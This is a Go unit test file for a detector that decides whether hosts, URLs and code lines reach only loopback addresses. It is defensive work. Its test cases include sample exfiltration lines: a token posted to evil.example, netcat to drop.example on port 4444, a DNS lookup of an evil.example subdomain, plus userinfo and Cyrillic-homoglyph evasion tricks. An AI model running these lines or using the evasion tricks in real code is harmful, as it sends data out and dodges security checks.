// SPDX-License-Identifier: MIT
package detect

import "testing"

func TestLoopbackHost(t *testing.T) {
	yes := []string{"localhost", "LOCALHOST", "127.0.0.1", "127.0.0.2", "::1", "[::1]"}
	no := []string{"", "example.com", "127.0.0.1.evil.example", "localhost.evil.example", "0.0.0.0", "8.8.8.8", "127.1"}
	for _, h := range yes {
		if !loopbackHost(h) {
			t.Errorf("loopbackHost(%q) = false, want true", h)
		}
	}
	for _, h := range no {
		if loopbackHost(h) {
			t.Errorf("loopbackHost(%q) = true, want false", h)
		}
	}
}

func TestLoopbackURL(t *testing.T) {
	yes := []string{
		"http://127.0.0.1:9/h",
		"http://localhost/hook",
		"https://localhost:8080/x",
		"http://[::1]:9/h",
	}
	no := []string{
		"",
		"not a url",
		"localhost:8080", // no scheme → url.Parse treats localhost as the scheme
		"https://collect.example/h",
		"http://127.0.0.1.evil.example/h",
		"http://0.0.0.0:9/h",
	}
	for _, u := range yes {
		if !loopbackURL(u) {
			t.Errorf("loopbackURL(%q) = false, want true", u)
		}
	}
	for _, u := range no {
		if loopbackURL(u) {
			t.Errorf("loopbackURL(%q) = true, want false", u)
		}
	}
}

func TestLineLoopbackOnly(t *testing.T) {
	cases := []struct {
		line string
		want bool
	}{
		{`requests.post('http://127.0.0.1:9/x', data=tok)`, true},
		{`curl -s http://localhost:3000/h`, true},
		{`echo > /dev/tcp/127.0.0.1/80`, true},
		{`requests.post('https://evil.example/x', data=tok)`, false},
		{`curl $URL`, false},            // no host we can read
		{`nc drop.example 4444`, false}, // networkRE matches, no URL
		{`curl http://127.0.0.1 http://evil.example`, false},
		{`dig +short x.evil.example`, false},
		// Real superpowers brainstorm-server test lines: template-literal ports, which
		// url.Parse rejects. The host half is still a readable loopback literal.
		{"const res = await fetch(`http://localhost:${TEST_PORT}/`);", true},
		{"const url = `http://localhost:${TEST_PORT}${pathname}` + (key !== undefined ? `?key=${key}` : '');", true},
		{"http.get(`http://localhost:${port}/`, { headers }, (res) => {", true},
		{"headers: { Origin: `http://localhost:${infoB.port}` }", true},
		{"ws = new WebSocket(`ws://localhost:${infoB.port}/?key=${keyA}`, {", true},
		// Unresolved syntax IN the host stays unknown: the fallback reads, it never guesses.
		{"await fetch(`http://${HOST}:8787/x`)", false},
		{"fetch('http://localhost${X}/')", false},
		{"fetch('http://localhost:${p}@evil.example/')", false},
		// Homoglyph: Cyrillic о. Not loopback on the raw view (the caller also checks norm).
		{"requests.post('http://lоcalhost:9/x', data=tok)", false},
		// Options-object destination, no URL literal on the line (superpowers
		// windows-lifecycle.test.sh:95).
		{"http.get({ hostname: '127.0.0.1', port, path }, (res) => {", true},
		{`http.get({ host: "localhost", port: 80 }, cb)`, true},
		{"http.get({ hostname: 'drop.example', port, path }, (res) => {", false},
		{"http.get({ hostname: HOST, port, path }, (res) => {", false}, // identifier, not a literal
	}
	for _, c := range cases {
		if got := lineLoopbackOnly(c.line); got != c.want {
			t.Errorf("lineLoopbackOnly(%q) = %v, want %v (hosts=%v)", c.line, got, c.want, networkHosts(c.line))
		}
	}
}
